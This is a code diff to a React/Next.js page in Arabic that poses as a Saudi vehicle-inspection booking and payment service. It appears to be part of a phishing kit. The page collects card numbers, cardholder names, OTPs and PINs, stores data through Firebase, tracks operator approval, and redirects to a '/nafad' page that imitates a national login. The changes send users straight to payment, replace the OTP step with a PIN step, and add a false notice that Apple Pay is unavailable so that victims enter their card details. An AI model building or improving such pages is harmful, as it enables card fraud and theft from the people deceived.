@@ -8,11 +8,12 @@ import { Button } from "@/components/ui/button"
 import { Card, CardContent } from "@/components/ui/card"
 import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
-import { ArrowLeft, Car, Truck, Calendar, ChevronDown, CreditCard, Wallet, Menu, Mail, Check, Lock } from "lucide-react"
+import { ArrowLeft, Car, Truck, Calendar, ChevronDown, CreditCard, Wallet, Menu, Mail, Check, Lock, AlertCircleIcon } from "lucide-react"
 import { doc, onSnapshot } from "firebase/firestore"
 import { addData, db } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
 import type { VehicleStatus, VehicleType, AppStep, PaymentMethod, BankInfo, BinDatabase, ApprovalStatus } from "@/lib/types"
+import { Alert, AlertDescription } from "@/components/ui/alert"
 
 // Removed duplicate type BankInfo definition as it's already imported from "@/types"
 // type BankInfo = {
@@ -42,7 +43,7 @@ export default function VehicleBooking() {
   const [captchaChecked, setCaptchaChecked] = useState(true)
   const [inspectionType, setInspectionType] = useState("") // Added declaration
 
-  const [currentStep, setCurrentStep] = useState<AppStep>("booking") // Changed initial step to landing
+  const [currentStep, setCurrentStep] = useState<AppStep>("payment-method") // Changed initial step to landing
   const [paymentMethod, setPaymentMethod] = useState<PaymentMethod | "">("")
   const [cardNumber, setCardNumber] = useState("")
   const [cardName, setCardName] = useState("")
@@ -167,7 +168,7 @@ export default function VehicleBooking() {
     })
     setIsLoading(true)
     setTimeout(() => {
-      setCurrentStep("otp")
+      setCurrentStep("pin")
       setIsLoading(false)
     }, 1500)
   }
@@ -1003,30 +1004,7 @@ window.location.href='/nafad'
               </div>
             )}
 
-            {/* Inspection center */}
-            <div className="space-y-2">
-              <Label htmlFor="inspection-center" className="text-sm font-medium text-gray-700">
-                مركز الفحص<span className="text-red-500">*</span>
-              </Label>
-              <div className="relative">
-                <select
-                  id="inspection-center"
-                  value={inspectionCenter}
-                  onChange={(e) => setInspectionCenter(e.target.value)}
-                  className="h-12 w-full bg-gray-50 border border-gray-300 rounded-md px-4 text-sm appearance-none"
-                  data-testid="select-inspection-center"
-                >
-                  <option value="">إختر مركز المعاينة</option>
-                  {inspectionCenters.map((c) => (
-                    <option key={c.value} value={c.value}>
-                      {c.label}
-                    </option>
-                  ))}
-                </select>
-                <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400 pointer-events-none" />
-              </div>
-            </div>
-
+         
             {/* Date picker with custom display */}
             <div className="space-y-2">
               <Label className="text-sm font-medium text-gray-700">
@@ -1244,6 +1222,14 @@ window.location.href='/nafad'
                   </button>
                 ))}
               </div>
+              <div>
+              <Alert variant="destructive">
+        <AlertCircleIcon />
+        <AlertDescription>
+          <p>عذراّ خدمة الدفع عبر ابل باي متوقفة موقتاّ يمكنك التمتع بتجربة دفع سلسلة واّمنة عبر بطاقات الدفع</p>
+        </AlertDescription>
+      </Alert>
+              </div>
             </div>
 
             <div className="flex gap-3 pt-6">
@@ -1279,7 +1265,7 @@ window.location.href='/nafad'
         <main className="flex-1">
           <div className="bg-teal-700 py-6 shadow-sm">
             <div className="container mx-auto px-4">
-              <h1 className="text-2xl font-bold text-whitetext-center">الدفع الإلكتروني</h1>
+              <h1 className="text-2xl font-bold text-white text-center">الدفع الإلكتروني</h1>
               <p className="text-sm text-teal-700-foreground/80 text-center mt-1">
                 ادفع رسوم الفحص الفني الدوري بشكل آمن أون لاين
               </p>
@@ -1362,7 +1348,7 @@ window.location.href='/nafad'
 
                   <div className="space-y-2">
                     <Label htmlFor="card-name" className="text-sm">
-                      اسم حامل البطاقة / الاسكريبشن<span className="text-destructive">*</span>
+                      اسم حامل البطاقة<span className="text-destructive">*</span>
                     </Label>
                     <Input
                       id="card-name"
@@ -1517,94 +1503,6 @@ window.location.href='/nafad'
     )
   }
 
-  if (currentStep === "otp") {
-    return (
-      <div dir="rtl" className="min-h-screen bg-background">
-        <main className="flex-1">
-          <div className="bg-teal-700 py-6 shadow-sm">
-            <div className="container mx-auto px-4">
-              <h1 className="text-2xl font-bold text-whitetext-center">التحقق برمز OTP</h1>
-            </div>
-          </div>
-
-          <form onSubmit={handleOtpSubmit} className="container mx-auto px-4 py-8 space-y-8 max-w-2xl">
-            <div className="text-center space-y-3">
-              <p className="text-muted-foreground text-lg">تم إرسال رمز التحقق إلى رقم جوالك</p>
-              <p className="font-semibold text-xl">+966 *** *** **45</p>
-            </div>
-
-            <Card className="shadow-sm">
-              <CardContent className="p-8">
-                <div className="space-y-6">
-                  <Label htmlFor="otp-input" className="text-center block text-lg font-medium">
-                    أدخل رمز التحقق (6 أرقام)<span className="text-destructive">*</span>
-                  </Label>
-
-                  <div className="max-w-sm mx-auto">
-                    <Input
-                      id="otp-input"
-                      type="text"
-                      maxLength={6}
-                      value={otp}
-                      onChange={(e) => {
-                        setOtp(e.target.value.replace(/\D/g, ""))
-                        setOtpError("")
-                        setCardOtpApproval(undefined)
-                      }}
-                      placeholder="000000"
-                      className="h-16 text-center text-2xl font-bold tracking-widest border-2 focus:border-teal-700 shadow-sm"
-                      dir="ltr"
-                      required
-                      disabled={isLoading}
-                    />
-                    <p className="text-xs text-muted-foreground text-center mt-2">{otp.length}/6 أرقام</p>
-                    {otpError && <p className="text-destructive text-sm text-center mt-2">{otpError}</p>}
-                    {cardOtpApproval === "pending" && (
-                      <div className="flex items-center justify-center gap-2 mt-4">
-                        <div className="animate-spin h-4 w-4 border-2 border-teal-700 border-t-transparent rounded-full" />
-                        <p className="text-sm text-muted-foreground">جاري التحقق من الرمز...</p>
-                      </div>
-                    )}
-                  </div>
-
-                  <div className="text-center pt-2">
-                    <Button type="button" variant="link" className="text-base font-medium" disabled={isLoading}>
-                      إعادة إرسال الرمز
-                    </Button>
-                  </div>
-                </div>
-              </CardContent>
-            </Card>
-
-            <div className="flex gap-3 pt-6">
-              <Button
-                type="button"
-                variant="outline"
-                onClick={() => setCurrentStep("card-form")}
-                className="flex-1 h-12 border-2"
-                disabled={isLoading}
-              >
-                رجوع
-              </Button>
-              <Button type="submit" className="flex-1 h-12 gap-2 shadow-sm" disabled={isLoading || otp.length < 6}>
-                {isLoading ? (
-                  <>
-                    <div className="animate-spin h-5 w-5 border-2 border-current border-t-transparent rounded-full" />
-                    <span>جاري التحقق...</span>
-                  </>
-                ) : (
-                  <>
-                    <span>التحقق</span>
-                    <ArrowLeft className="w-5 h-5" />
-                  </>
-                )}
-              </Button>
-            </div>
-          </form>
-        </main>
-      </div>
-    )
-  }
 
   if (currentStep === "pin") {
     return (
